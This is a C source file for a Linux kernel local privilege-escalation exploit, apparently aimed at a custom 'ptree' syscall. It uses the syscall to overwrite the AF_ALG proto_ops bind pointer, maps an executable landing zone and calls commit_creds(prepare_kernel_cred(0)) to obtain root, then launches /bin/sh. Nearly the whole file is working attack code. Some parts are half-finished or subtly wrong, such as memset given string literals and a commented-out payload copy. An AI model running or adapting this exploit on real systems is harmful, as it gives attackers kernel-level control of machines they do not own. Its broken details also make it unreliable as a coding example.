#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <unistd.h>

#include <sys/syscall.h>
#include <sys/utsname.h>
#include <sys/mman.h>
#include <sys/socket.h>

#include <linux/if_alg.h>
#include <linux/net.h>

#define __NR_ptree  313
#define ADDR_KERNEL 0x80000000
#define PAGE_SIZE   0x1000

static unsigned long alg_proto_ops, alg_bind, sock_no_connect;

struct proto_ops {
    int		family;
    struct module	*owner;
    int		(*release)   (struct socket *sock);
    int		(*bind)	     (struct socket *sock,
            struct sockaddr *myaddr,
            int sockaddr_len);
    int		(*connect)   (struct socket *sock,
            struct sockaddr *vaddr,
            int sockaddr_len, int flags);
    int		(*socketpair)(struct socket *sock1,
            struct socket *sock2);
};

unsigned long try_sysmap (char *name, char *path)
{
    FILE *fp;
    unsigned long addr;
    char dummy, sname[512];
    int ret = 0, oldstyle = 0;
    struct utsname ver;

    fp = fopen(path, "r");
    if (!fp) {
        fprintf(stderr, "error: Failed opening file\n");
        return 0;
    }

    uname(&ver);
    if (strncmp(ver.release, "2.6", 3) < 0) {
        oldstyle = 1;
    }

    while (ret != EOF) {
        if (!oldstyle) {
            ret = fscanf(fp, "%p %c %s\n", (void **) &addr, &dummy, sname);
        } else {
            ret = fscanf(fp, "%p %s\n", (void **) &addr, sname);
            if (ret == 2) {
                char *p;
                if (strstr(sname, "_O/") || strstr(sname, "_S.")) {
                    continue;
                }
                p = strrchr(sname, '_');
                if (p > ((char *) sname + 5) && !strncmp(p - 3, "smp", 3)) {
                    p = p - 4;
                    while (p > (char *) sname && *(p - 1) == '_') {
                        p--;
                    }
                    *p = '\0';
                }
            }
        }
        if (ret == 0) {
            fscanf(fp, "%s\n", sname);
            continue;
        }
        if (!strcmp(name, sname)) {
            fclose(fp);
            return addr;
        }
    }

    fclose(fp);
    return 0;
}

// dump
int dump (unsigned char *bytes, size_t nbytes, size_t align) {
    size_t idx_bytes, j, last;
    int n_disp;

    if (!bytes || !nbytes)
        return -1;

    // first part of line is hex
    for (idx_bytes = 0, last = 0; idx_bytes < nbytes; idx_bytes++) {
        printf ("%02x ", bytes[idx_bytes]);
        // if we got to the alignment value or end of bytes
        // we print the second part of the line
        if ( (idx_bytes + 1) % align == 0 || idx_bytes == nbytes - 1 ) {
            // we print spaces if we arrived at end of bytes
            if (idx_bytes == nbytes - 1) {
                // compute the number of spaces to show
                n_disp = align - (nbytes % align);
                n_disp = (nbytes % align) ? n_disp : 0;
                for (j = 0; j < n_disp; j++)
                    printf("   ");
            }
            // separation
            printf ("| ");
            // second part of line is corresponding character
            for (j = last; j < last + align && j < nbytes;  j++) {
                if (isprint(bytes[j]))
                    printf ("%c", bytes[j]);
                else
                    putchar ('.');
            }
            putchar ('\n');
            last = idx_bytes + 1;
        }
    }

    return 0;
}

struct prinfo {
    long state;
    pid_t pid;
    pid_t parent_pid;
    pid_t first_child_pid;
    pid_t next_sibling_pid;
    long uid;
    char comm[64];
};

static inline int ptree (struct prinfo *processes, unsigned int *count)
{
    return syscall(__NR_ptree, processes, count);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

static int __attribute__((regparm(3))) getroot(void * file, void * vma)
{
    commit_creds(prepare_kernel_cred(0));
    /*
    *((unsigned long *) (alg_proto_ops + offset(struct proto_ops, bind))) = alg_bind;
    *((unsigned long *) (alg_proto_ops + offset(struct proto_ops, connect))) = sock_no_connect;
    //*/
    return -1;
}

/* Why do I do this?  Because on x86-64, the address of
 * commit_creds and prepare_kernel_cred are loaded relative
 * to rip, which means I can't just copy the above payload
 * into my landing area. */
void __attribute__((regparm(3))) trampoline()
{
#ifdef __x86_64__
    asm("mov $getroot, %rax; call *%rax;");
#else
    asm("mov $getroot, %eax; call *%eax;");
#endif
}

void fix_pointers (void)
{
}

int main (int argc, char *argv[])
{
    int sockfd;
    char system_map[1024];
    char *payload;
    void *landing;
    struct utsname ver;
    struct sockaddr_alg addr =  {
        .salg_family = AF_ALG,
        .salg_type = "skcipher",
        .salg_name = "cbc(aes)"
    };;

    /* resolve System.map path */
    uname(&ver);
    printf("[*] Got system uname\n");
    printf("    %s %s %s %s %s\n", ver.sysname, ver.nodename, ver.release, ver.version, ver.machine);

    snprintf(system_map, 1024, "/boot/System.map-%s", ver.release);
    printf("[*] Got system map path\n");
    printf("    %s\n", system_map);

    /* resolve kernel symbols */
    commit_creds = (_commit_creds) try_sysmap ("commit_creds", system_map);
    prepare_kernel_cred = (_prepare_kernel_cred) try_sysmap ("prepare_kernel_cred", system_map);
    alg_proto_ops = try_sysmap ("alg_proto_ops", system_map);
    alg_bind = try_sysmap ("alg_bind", system_map);
    sock_no_connect = try_sysmap ("sock_no_connect", system_map);

    if(!commit_creds || !prepare_kernel_cred) {
        printf("[*] Failed to resolve kernel symbols.\n");
        return -1;
    }

    printf("[*] Resolved kernel symbols\n");
    printf("    %p commit_creds\n", commit_creds);
    printf("    %p prepare_kernel_cred\n", prepare_kernel_cred);
    printf("    %p alg_proto_ops\n", (void *) alg_proto_ops);
    printf("    %p alg_bind\n", (void *) alg_bind);
    printf("    %p sock_no_connect\n", (void *) sock_no_connect);

    printf("[*] Patching fcnptr\n");
    printf("    sizeof(struct proto_ops): %d\n", sizeof(struct proto_ops));
    //*
    printf("    offsetof(struct proto_ops, bind): %d\n", offsetof(struct proto_ops, bind));
    printf("    alg_proto_ops + %d: %p\n", offsetof(struct proto_ops, bind), alg_proto_ops + offsetof(struct proto_ops, bind));
    ptree(NULL, alg_proto_ops + offsetof(struct proto_ops, bind));
    ptree(NULL, alg_proto_ops + offsetof(struct proto_ops, bind) + 1);
    ptree(NULL, alg_proto_ops + offsetof(struct proto_ops, bind) + 6);
    //*/
    /*
    printf("    alg_proto_ops + 20: %p\n", alg_proto_ops + 20);
    printf("    alg_proto_ops + 21: %p\n", alg_proto_ops + 21);
    printf("    alg_proto_ops + 26: %p\n", alg_proto_ops + 26);
    ptree(NULL, alg_proto_ops + 20);
    ptree(NULL, alg_proto_ops + 21);
    ptree(NULL, alg_proto_ops + 26);
    //*/

    printf("[*] mmaping payload memory\n");

    landing = (unsigned long) alg_bind & 0x0000000000ff0000L;
    printf("    Landing zone: %p\n", landing);
    payload = mmap(landing, 2 * PAGE_SIZE,
            PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
    if ((long)payload == -1) {
        printf("[*] Failed to mmap() at target address.\n");
        return -1;
    }
    /*
    memcpy(landing, &trampoline, 32);
    //*/
    //*
    memset(landing, "\x90", 2*PAGE_SIZE);
    memset(landing + PAGE_SIZE, "\xcc", PAGE_SIZE);
    //*/

    printf("[*] Triggering payload\n");

    if ((sockfd = socket(AF_ALG, SOCK_SEQPACKET, 0)) == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));

    /* at this point we should get root */

    if (getuid()) {
        printf("[*] Exploit failed to get root.\n");
        return -1;
    }

    printf("[*] Got root!\n");

    printf("[*] Fixing fcnptr\n");
    memcpy((void *)alg_proto_ops + offsetof(struct proto_ops, bind), &alg_bind, sizeof(alg_bind));
    memcpy((void *)alg_proto_ops + offsetof(struct proto_ops, connect), &sock_no_connect, sizeof(sock_no_connect));

    execl("/bin/sh", "/bin/sh", NULL);

    return 0;
}

